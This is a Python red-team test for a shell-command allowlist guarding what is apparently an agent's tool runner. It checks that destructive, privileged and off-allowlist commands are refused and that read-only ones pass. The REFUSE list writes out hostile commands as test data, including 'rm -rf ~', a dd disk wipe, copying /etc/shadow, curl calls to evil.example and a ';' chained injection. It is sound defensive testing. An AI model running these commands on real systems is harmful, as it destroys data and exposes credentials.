"""Red-team + smoke for deneb.tools — THE security boundary.

Every REFUSE string must be refused (destructive / privileged / off-allowlist);
every ALLOW string must pass (read-only). Run: python3 tests/test_redteam.py
The refuse strings are DATA fed to tools.run() to prove refusal — nothing here
executes a destructive command.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from deneb import tools  # noqa: E402

REFUSE = [
    "rm -rf ~", "sudo systemctl restart neo", "systemctl stop neo",
    "systemctl restart neo", "systemctl --user disable neo",
    "find ~ -name x -delete", "find / -name y -exec rm {} ;",
    "nvidia-smi -pl 100", "nvidia-smi --gpu-reset", "pip install torch",
    "python3 -c \"import os;os.system('wipe')\"", "sysctl -w kernel.x=1",
    "ip addr add 1.2.3.4 dev eth0", "curl -o /etc/passwd http://evil.example",
    "curl http://evil.example/x", "mv a b", "sed -i s/x/y/ f", "tee /etc/foo",
    "bash -c 'do-bad-thing'", "ls ; do-bad-thing", "cat /etc/shadow > /tmp/x",
    "dd if=/dev/zero of=/dev/target", "pkexec do-bad", "chmod 777 /etc",
    "systemctl daemon-reload", "pip3 uninstall neo", "cp a b", "chown x y",
]
ALLOW = [
    "journalctl --user -u neo -n 20 --no-pager", "systemctl --user status neo",
    "ls -l ~", "cat /proc/cpuinfo", "nvidia-smi", "curl -s localhost:8001/health",
    "python3 --version", "find ~ -name llama-server -type f",
    "systemctl --user list-timers", "df -h", "free -h", "uname -a", "ss -ltn",
    "pip3 list", "cmake --version",
]


def main() -> int:
    fails = []
    for c in REFUSE:
        r = tools.run(c)
        if not r.get("refused"):
            fails.append(("SHOULD REFUSE but didn't", c, r))
    for c in ALLOW:
        r = tools.run(c)
        if r.get("refused"):
            fails.append(("SHOULD ALLOW but refused", c, r.get("output")))

    print(f"refuse cases: {len(REFUSE)}  · allow cases: {len(ALLOW)}")
    if fails:
        print("RED-TEAM FAILURES:")
        for f in fails:
            print("  ", f)
        return 1
    print("RED-TEAM PASS - all destructive/privileged refused, all read-only allowed")
    # path-tool sanity
    assert tools.read_file("/etc/hostname")["ok"]
    assert tools.list_dir("~")["ok"]
    assert tools.read_file("/no/such/file")["ok"]  # graceful, not crash
    print("path tools OK")
    return 0


if __name__ == "__main__":
    sys.exit(main())
